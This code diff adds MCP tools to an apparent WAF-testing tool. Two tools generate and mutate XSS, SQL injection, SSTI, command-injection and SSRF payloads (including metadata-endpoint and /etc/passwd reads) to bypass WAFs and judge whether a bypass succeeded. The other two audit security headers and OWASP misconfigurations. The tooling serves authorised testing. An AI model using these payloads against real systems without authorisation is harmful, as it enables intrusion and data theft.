@@ -1183,6 +1183,498 @@ def create_server() -> "FastMCP":
         except Exception as e:
             return json.dumps({"error": str(e)})
 
+    # ── Tool: ai_suggest_payloads ─────────────────────────────────────
+
+    @mcp.tool()
+    async def ai_suggest_payloads(
+        target: str,
+        context: str = "",
+        category: str = "xss",
+        waf_vendor: str = "",
+        blocked_payloads: str = "",
+        max_suggestions: int = 10,
+    ) -> str:
+        """AI-powered payload suggestion based on target context.
+
+        Analyzes the target's WAF behavior, technology stack, and previously
+        blocked payloads to suggest the most likely bypass candidates.
+        Uses Fray's WAF intelligence database and mutation engine.
+
+        Args:
+            target: Target URL (e.g. 'https://example.com/search?q=')
+            context: Additional context (e.g. 'React app behind Cloudflare, CSP with unsafe-inline')
+            category: Attack category (xss, sqli, ssti, command_injection, ssrf)
+            waf_vendor: Known WAF vendor (e.g. 'cloudflare', 'akamai', 'aws_waf')
+            blocked_payloads: Comma-separated list of payloads that were blocked
+            max_suggestions: Number of suggestions to generate (default: 10)
+        """
+        logger.info(f"ai_suggest_payloads for {target}, cat={category}, waf={waf_vendor}")
+        try:
+            from fray import load_waf_intel
+            from fray.mutator import mutate_payload
+            from fray.bypass import WAF_EVASION_HINTS
+
+            suggestions = []
+
+            # Load WAF intel for vendor-specific strategies
+            intel = {}
+            try:
+                intel_db = load_waf_intel()
+                if waf_vendor:
+                    for vendor_key, vendor_data in intel_db.items():
+                        if waf_vendor.lower() in vendor_key.lower():
+                            intel = vendor_data
+                            break
+            except Exception:
+                pass
+
+            # Get vendor-specific hints
+            hints = {}
+            if waf_vendor:
+                waf_key = waf_vendor.lower().replace(" ", "_").replace("-", "_")
+                for alias, canonical in [("cf", "cloudflare"), ("aws", "aws_waf"),
+                                          ("modsec", "modsecurity")]:
+                    if waf_key == alias:
+                        waf_key = canonical
+                hints = WAF_EVASION_HINTS.get(waf_key, {})
+
+            # Base payloads per category
+            seeds = {
+                "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+                         "<svg/onload=alert(1)>", "<details open ontoggle=alert(1)>"],
+                "sqli": ["' OR 1=1--", "' UNION SELECT NULL--",
+                          "1' AND '1'='1", "admin'/**/OR/**/1=1--"],
+                "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}"],
+                "command_injection": ["; id", "| id", "`id`", "$(id)"],
+                "ssrf": ["http://169.254.169.254/latest/meta-data/",
+                          "http://127.0.0.1:80", "file:///etc/passwd"],
+            }.get(category, ["<script>alert(1)</script>"])
+
+            # If blocked payloads provided, mutate those instead
+            if blocked_payloads:
+                seeds = [p.strip() for p in blocked_payloads.split(",") if p.strip()]
+
+            # Generate mutations with strategies
+            for seed in seeds[:5]:
+                variants = mutate_payload(seed, max_variants=max_suggestions // len(seeds[:5]))
+                for v in variants:
+                    suggestion = {
+                        "payload": v["payload"],
+                        "strategy": v["strategy"],
+                        "original": v["original"],
+                        "reasoning": f"Mutated via {v['strategy']}",
+                    }
+                    # Add vendor-specific reasoning
+                    if hints:
+                        tips = hints.get("tips", [])
+                        if tips:
+                            suggestion["waf_tip"] = tips[0]
+                    if intel:
+                        effective = intel.get("effective_techniques", [])
+                        if effective:
+                            suggestion["intel"] = f"Effective against {waf_vendor}: {', '.join(effective[:3])}"
+                    suggestions.append(suggestion)
+
+            # Add context-aware suggestions
+            if context:
+                ctx_lower = context.lower()
+                if "csp" in ctx_lower and "unsafe-inline" in ctx_lower:
+                    suggestions.append({
+                        "payload": "<script>alert(document.domain)</script>",
+                        "strategy": "csp_unsafe_inline",
+                        "reasoning": "CSP allows unsafe-inline — inline scripts execute directly",
+                    })
+                if "react" in ctx_lower:
+                    suggestions.append({
+                        "payload": "javascript:alert(1)//",
+                        "strategy": "react_href",
+                        "reasoning": "React dangerouslySetInnerHTML or href=javascript: may bypass",
+                    })
+                if "angular" in ctx_lower:
+                    suggestions.append({
+                        "payload": "{{constructor.constructor('alert(1)')()}}",
+                        "strategy": "angular_sandbox",
+                        "reasoning": "Angular sandbox escape via constructor chain",
+                    })
+
+            return json.dumps(suggestions[:max_suggestions], indent=2, ensure_ascii=False)
+        except Exception as e:
+            return json.dumps({"error": str(e)})
+
+    # ── Tool: analyze_response ─────────────────────────────────────────
+
+    @mcp.tool()
+    async def analyze_response(
+        payload: str,
+        status_code: int,
+        response_body: str,
+        response_headers: str = "",
+        baseline_status: int = 200,
+        baseline_length: int = 0,
+    ) -> str:
+        """Analyze a WAF response to detect false negatives and edge bypasses.
+
+        Examines response characteristics to determine if a payload truly
+        bypassed the WAF, was silently blocked (soft block), or triggered
+        a challenge page. Detects false negatives that static rules miss.
+
+        Args:
+            payload: The payload that was sent
+            status_code: HTTP status code of the response
+            response_body: Response body text (first 2000 chars is enough)
+            response_headers: Response headers as text
+            baseline_status: Normal response status code (default: 200)
+            baseline_length: Normal response body length in bytes
+        """
+        logger.info(f"analyze_response: status={status_code}, payload_len={len(payload)}")
+        analysis = {
+            "payload": payload[:200],
+            "status_code": status_code,
+            "verdict": "unknown",
+            "confidence": 0,
+            "indicators": [],
+            "recommendations": [],
+        }
+
+        body_lower = response_body.lower() if response_body else ""
+        body_len = len(response_body) if response_body else 0
+
+        # 1. Hard block detection
+        if status_code in (403, 406, 429, 500, 501, 503):
+            analysis["verdict"] = "blocked"
+            analysis["confidence"] = 95
+            analysis["indicators"].append(f"HTTP {status_code} — typical WAF block status")
+            analysis["recommendations"].append("Try encoding variants: URL encode, double encode, HTML entities")
+            return json.dumps(analysis, indent=2)
+
+        # 2. Soft block detection (200 but WAF replaced body)
+        if baseline_length > 0 and body_len > 0:
+            ratio = body_len / baseline_length
+            if ratio < 0.4 and baseline_length > 1000:
+                analysis["verdict"] = "soft_block"
+                analysis["confidence"] = 80
+                analysis["indicators"].append(
+                    f"Response body {body_len}b vs baseline {baseline_length}b "
+                    f"({ratio:.0%}) — WAF likely replaced page with block page")
+                analysis["recommendations"].append("This is a WAF block disguised as 200. Try different encoding.")
+                return json.dumps(analysis, indent=2)
+
+        # 3. Challenge/CAPTCHA detection
+        challenge_sigs = [
+            ("cf-turnstile", "Cloudflare Turnstile challenge"),
+            ("cf-challenge", "Cloudflare JS challenge"),
+            ("just a moment", "Cloudflare browser check"),
+            ("captcha", "CAPTCHA challenge"),
+            ("recaptcha", "Google reCAPTCHA"),
+            ("hcaptcha", "hCaptcha"),
+            ("ddos protection", "DDoS protection page"),
+            ("ray id:", "Cloudflare Ray ID (block/challenge page)"),
+            ("attention required", "Cloudflare attention page"),
+        ]
+        for sig, desc in challenge_sigs:
+            if sig in body_lower:
+                analysis["verdict"] = "challenge"
+                analysis["confidence"] = 85
+                analysis["indicators"].append(f"Detected: {desc}")
+                analysis["recommendations"].append("WAF is serving a challenge page. Try header manipulation or encoding.")
+                return json.dumps(analysis, indent=2)
+
+        # 4. Reflection analysis — potential true bypass
+        reflected = payload.lower() in body_lower if payload and body_lower else False
+        partial_reflect = False
+        if not reflected and payload:
+            # Check for partial reflection (encoded or modified)
+            import urllib.parse
+            decoded = urllib.parse.unquote(payload)
+            if decoded.lower() in body_lower:
+                partial_reflect = True
+
+        if reflected:
+            analysis["verdict"] = "bypass_confirmed"
+            analysis["confidence"] = 95
+            analysis["indicators"].append("Payload reflected verbatim in response — confirmed XSS/injection vector")
+            analysis["recommendations"].append("HIGH PRIORITY: Payload is reflected. Verify DOM context for exploitability.")
+        elif partial_reflect:
+            analysis["verdict"] = "bypass_likely"
+            analysis["confidence"] = 75
+            analysis["indicators"].append("Decoded payload found in response — likely bypass with server-side decoding")
+            analysis["recommendations"].append("Server decoded the payload. Try additional encoding layers.")
+        elif status_code == 200 and (baseline_length == 0 or abs(body_len - baseline_length) / max(baseline_length, 1) < 0.15):
+            analysis["verdict"] = "likely_ignored"
+            analysis["confidence"] = 60
+            analysis["indicators"].append("Response matches baseline — server likely ignored the parameter")
+            analysis["recommendations"].append("Try different injection points: headers, cookies, path, POST body")
+        else:
+            analysis["verdict"] = "bypass_possible"
+            analysis["confidence"] = 50
+            analysis["indicators"].append(f"Status {status_code}, body differs from baseline — manual review needed")
+            analysis["recommendations"].append("Check if the application processed the payload. Look for behavioral differences.")
+
+        # 5. WAF vendor fingerprints in headers
+        if response_headers:
+            hdrs_lower = response_headers.lower()
+            vendor_sigs = [
+                ("cf-ray", "Cloudflare"), ("x-sucuri-id", "Sucuri"),
+                ("x-akamai", "Akamai"), ("x-amz-cf-id", "AWS CloudFront"),
+                ("x-ms-", "Azure"), ("server: bigip", "F5 BIG-IP"),
+            ]
+            for sig, vendor in vendor_sigs:
+                if sig in hdrs_lower:
+                    analysis["indicators"].append(f"WAF detected: {vendor}")
+                    analysis["recommendations"].append(f"Use vendor-specific strategies for {vendor}")
+
+        return json.dumps(analysis, indent=2, ensure_ascii=False)
+
+    # ── Tool: hardening_check ──────────────────────────────────────────
+
+    @mcp.tool()
+    async def hardening_check(target: str) -> str:
+        """Check WAF-relevant security headers and hardening configuration.
+
+        Verifies critical defense headers and provides copy-paste fix configs
+        for nginx, Apache, Cloudflare Workers, and Next.js.
+
+        Checks: HSTS, CSP, X-Frame-Options, X-Content-Type-Options,
+        Referrer-Policy, Permissions-Policy, COOP, CORP, rate-limit headers.
+
+        Args:
+            target: Target URL to check (e.g. 'https://example.com')
+        """
+        logger.info(f"hardening_check for {target}")
+        import asyncio
+        try:
+            from fray.recon.fingerprint import check_security_headers
+            from fray.recon.http import fetch_headers
+
+            headers = await asyncio.to_thread(fetch_headers, target, timeout=8)
+            if not headers:
+                return json.dumps({"error": "Could not fetch headers from target"})
+
+            result = check_security_headers(headers)
+
+            # Add rate-limit header checks
+            rate_limit_headers = {
+                "x-ratelimit-limit": "Rate limit ceiling",
+                "x-ratelimit-remaining": "Remaining requests",
+                "x-ratelimit-reset": "Rate limit reset time",
+                "retry-after": "Retry-After header",
+                "ratelimit-limit": "Standard RateLimit header",
+                "ratelimit-policy": "RateLimit policy header",
+            }
+            rl_present = {}
+            rl_missing = []
+            for hdr_key, desc in rate_limit_headers.items():
+                if hdr_key in headers:
+                    rl_present[hdr_key] = {"value": headers[hdr_key], "description": desc}
+                else:
+                    rl_missing.append(hdr_key)
+
+            result["rate_limit_headers"] = {
+                "present": rl_present,
+                "missing": rl_missing,
+                "has_rate_limiting": len(rl_present) > 0,
+            }
+
+            # Grade
+            score = result.get("score", 0)
+            if score >= 80:
+                grade = "A"
+            elif score >= 60:
+                grade = "B"
+            elif score >= 40:
+                grade = "C"
+            elif score >= 20:
+                grade = "D"
+            else:
+                grade = "F"
+            result["grade"] = grade
+            result["target"] = target
+
+            return json.dumps(result, indent=2, ensure_ascii=False)
+        except Exception as e:
+            return json.dumps({"error": str(e)})
+
+    # ── Tool: owasp_misconfig_check ────────────────────────────────────
+
+    @mcp.tool()
+    async def owasp_misconfig_check(target: str) -> str:
+        """Check for OWASP Top 10 security misconfigurations beyond WAF bypass.
+
+        Performs comprehensive checks for:
+        - A01 Broken Access Control: open admin panels, directory listing, CORS
+        - A02 Cryptographic Failures: weak TLS, missing HSTS, insecure cookies
+        - A03 Injection: injectable parameters, GraphQL introspection
+        - A05 Security Misconfiguration: default configs, verbose errors,
+          exposed files, debug endpoints, server info leakage
+        - A06 Vulnerable Components: outdated frontend libs, known CVEs
+        - A07 Auth Failures: exposed login, weak session config
+        - A09 Logging Failures: missing security event headers
+
+        Returns structured findings with severity ratings and fix recommendations.
+
+        Args:
+            target: Target URL (e.g. 'https://example.com')
+        """
+        logger.info(f"owasp_misconfig_check for {target}")
+        import asyncio
+        try:
+            from fray.recon import run_recon
+            result = await asyncio.to_thread(
+                run_recon, target, timeout=8, mode="fast")
+
+            atk = result.get("attack_surface", {})
+            findings = atk.get("findings", [])
+            hdr = result.get("headers", {})
+            tls = result.get("tls", {})
+            csp = result.get("csp", {})
+            cookies = result.get("cookies", {})
+            fp = result.get("fingerprint", {})
+
+            checks = {
+                "target": target,
+                "risk_score": atk.get("risk_score", 0),
+                "risk_level": atk.get("risk_level", "?"),
+                "owasp_checks": {},
+            }
+
+            # A01: Broken Access Control
+            a01 = {"status": "pass", "findings": []}
+            cors = result.get("cors", {})
+            if cors.get("allows_any_origin"):
+                a01["findings"].append({"severity": "high", "issue": "CORS allows any origin (*)",
+                    "fix": "Restrict Access-Control-Allow-Origin to trusted domains"})
+            admin_panels = atk.get("admin_panels", 0)
+            open_admin = atk.get("open_admin_panels", 0)
+            if open_admin > 0:
+                a01["findings"].append({"severity": "critical",
+                    "issue": f"{open_admin} open admin panel(s) accessible without auth",
+                    "fix": "Require authentication for all admin endpoints"})
+            if a01["findings"]:
+                a01["status"] = "fail"
+            checks["owasp_checks"]["A01_Broken_Access_Control"] = a01
+
+            # A02: Cryptographic Failures
+            a02 = {"status": "pass", "findings": []}
+            if tls.get("tls_version") and "1.0" in str(tls.get("tls_version", "")):
+                a02["findings"].append({"severity": "high", "issue": "TLS 1.0 detected",
+                    "fix": "Upgrade to TLS 1.2 minimum, prefer TLS 1.3"})
+            if tls.get("tls_version") and "1.1" in str(tls.get("tls_version", "")):
+                a02["findings"].append({"severity": "medium", "issue": "TLS 1.1 detected",
+                    "fix": "Upgrade to TLS 1.2 minimum"})
+            hsts = hdr.get("present", {}).get("HSTS")
+            if not hsts:
+                a02["findings"].append({"severity": "high",
+                    "issue": "Missing HSTS header",
+                    "fix": "add_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload'"})
+            cookie_issues = cookies.get("issues", [])
+            for ci in cookie_issues[:3]:
+                if "Secure" in ci.get("issue", ""):
+                    a02["findings"].append({"severity": "medium",
+                        "issue": f"Cookie '{ci.get('cookie', '?')}' missing Secure flag",
+                        "fix": "Set Secure flag on all cookies"})
+            if a02["findings"]:
+                a02["status"] = "fail"
+            checks["owasp_checks"]["A02_Cryptographic_Failures"] = a02
+
+            # A03: Injection
+            a03 = {"status": "pass", "findings": []}
+            injectable = atk.get("injectable_params", 0)
+            if injectable > 0:
+                a03["findings"].append({"severity": "high",
+                    "issue": f"{injectable} potentially injectable parameter(s)",
+                    "fix": "Validate and sanitize all user input; use parameterized queries"})
+            graphql = atk.get("graphql_endpoints", 0)
+            if graphql > 0:
+                a03["findings"].append({"severity": "medium",
+                    "issue": f"{graphql} GraphQL endpoint(s) — check introspection",
+                    "fix": "Disable GraphQL introspection in production"})
+            if a03["findings"]:
+                a03["status"] = "fail"
+            checks["owasp_checks"]["A03_Injection"] = a03
+
+            # A05: Security Misconfiguration
+            a05 = {"status": "pass", "findings": []}
+            exposed = atk.get("exposed_files", 0)
+            if exposed > 0:
+                a05["findings"].append({"severity": "medium",
+                    "issue": f"{exposed} exposed sensitive file(s)",
+                    "fix": "Block access to sensitive files (.env, .git, backup files)"})
+            staging = atk.get("staging_envs", [])
+            if staging:
+                a05["findings"].append({"severity": "high",
+                    "issue": f"Staging environments found: {', '.join(staging[:3])}",
+                    "fix": "Remove staging/dev environments from public DNS"})
+            if not csp.get("present"):
+                a05["findings"].append({"severity": "high",
+                    "issue": "No Content-Security-Policy header",
+                    "fix": "Implement CSP with restrictive default-src"})
+            elif csp.get("weaknesses"):
+                for w in csp["weaknesses"][:2]:
+                    a05["findings"].append({"severity": "medium",
+                        "issue": f"CSP weakness: [{w.get('directive', '?')}] {w.get('description', '')}",
+                        "fix": w.get("recommendation", "Tighten CSP directive")})
+            server_header = hdr.get("present", {})
+            # Check if Server header leaks version info
+            for f in findings:
+                if "server info" in f.get("finding", "").lower() or "version" in f.get("finding", "").lower():
+                    a05["findings"].append({"severity": "low",
+                        "issue": f["finding"],
+                        "fix": "Remove server version from response headers"})
+                    break
+            if a05["findings"]:
+                a05["status"] = "fail"
+            checks["owasp_checks"]["A05_Security_Misconfiguration"] = a05
+
+            # A06: Vulnerable Components
+            a06 = {"status": "pass", "findings": []}
+            fl = result.get("frontend_libs", {})
+            vuln_libs = fl.get("vulnerable_libs", 0)
+            if vuln_libs > 0:
+                a06["findings"].append({"severity": "high",
+                    "issue": f"{vuln_libs} vulnerable frontend library/libraries",
+                    "fix": "Update to patched versions"})
+                for v in fl.get("vulnerabilities", [])[:3]:
+                    a06["findings"].append({"severity": v.get("severity", "medium"),
+                        "issue": f"{v.get('id', '?')}: {v.get('summary', '')}",
+                        "fix": f"Update {v.get('component', '?')}"})
+            sri_missing = fl.get("sri_missing", 0)
+            if sri_missing > 0:
+                a06["findings"].append({"severity": "medium",
+                    "issue": f"{sri_missing} external script(s) without SRI",
+                    "fix": "Add integrity= attributes to external script/link tags"})
+            if a06["findings"]:
+                a06["status"] = "fail"
+            checks["owasp_checks"]["A06_Vulnerable_Components"] = a06
+
+            # A07: Auth Failures
+            a07 = {"status": "pass", "findings": []}
+            for ci in cookie_issues:
+                if "HttpOnly" in ci.get("issue", ""):
+                    a07["findings"].append({"severity": "medium",
+                        "issue": f"Cookie '{ci.get('cookie', '?')}' missing HttpOnly flag",
+                        "fix": "Set HttpOnly flag on session cookies"})
+                if "SameSite" in ci.get("issue", ""):
+                    a07["findings"].append({"severity": "low",
+                        "issue": f"Cookie '{ci.get('cookie', '?')}' missing SameSite",
+                        "fix": "Set SameSite=Lax or Strict on cookies"})
+            if a07["findings"]:
+                a07["status"] = "fail"
+            checks["owasp_checks"]["A07_Auth_Failures"] = a07
+
+            # Summary
+            total_checks = len(checks["owasp_checks"])
+            failed = sum(1 for c in checks["owasp_checks"].values() if c["status"] == "fail")
+            checks["summary"] = {
+                "total_checks": total_checks,
+                "passed": total_checks - failed,
+                "failed": failed,
+                "total_findings": sum(len(c["findings"]) for c in checks["owasp_checks"].values()),
+            }
+
+            return json.dumps(checks, indent=2, ensure_ascii=False)
+        except Exception as e:
+            return json.dumps({"error": str(e)})
+
     return mcp
 
 
